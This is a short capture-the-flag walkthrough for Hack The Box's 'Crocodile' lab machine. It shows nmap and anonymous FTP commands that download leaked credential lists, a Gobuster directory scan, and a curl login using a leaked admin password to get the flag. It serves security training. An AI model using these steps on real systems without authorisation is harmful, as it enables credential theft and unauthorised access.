## Introduction

In this tutorial, we’ll chain an anonymous FTP leak into a hidden web admin login on Hack The Box’s **Crocodile** box to retrieve the flag.

You’ll learn to:

- Enumerate FTP and download leaked credential files  
- Extract valid usernames/passwords  
- Use Gobuster to discover hidden web pages  
- Authenticate to a PHP login panel and capture the flag  

## Prerequisites

- Kali Linux (or any distro with `ftp`, `gobuster`, `curl`)  
- HTB VPN connection

---

## 1. FTP Enumeration

```bash
nmap -sC -sV -p 21,80 <IP>
ftp <IP>
# login: anonymous
dir
get allowed.userlist
get allowed.userlist.passwd
```

Inspect the lists:

```bash
cat allowed.userlist
cat allowed.userlist.passwd
```

## 2. Extract Credentials

From `allowed.userlist` + `.passwd`, find a valid pair (e.g. `admin / Supersecretpassword1`).

## 3. Discover Hidden Pages

```bash
gobuster dir \
  --url http://<IP>/ \
  --wordlist /usr/share/wordlists/dirb/common.txt \
  -x php,html
```

Look for `/login.php`.

## 4. Admin Login & Flag

```bash
curl -d "username=admin&password=Supersecretpassword1" \
     http://<IP>/login.php
```

You’ll be redirected to the Admin panel—your flag is displayed at the top.

---

## 5. Lessons Learned

- **Anonymous services** often leak credentials.  
- **Combine** leaked creds with web enumeration for full-chain exploits.  
- **Automate** with scripts in professional engagements.

---

🔗 **Repo & full write‑up:** https://github.com/keyfive5/obsidiansignal-htb-crocodile
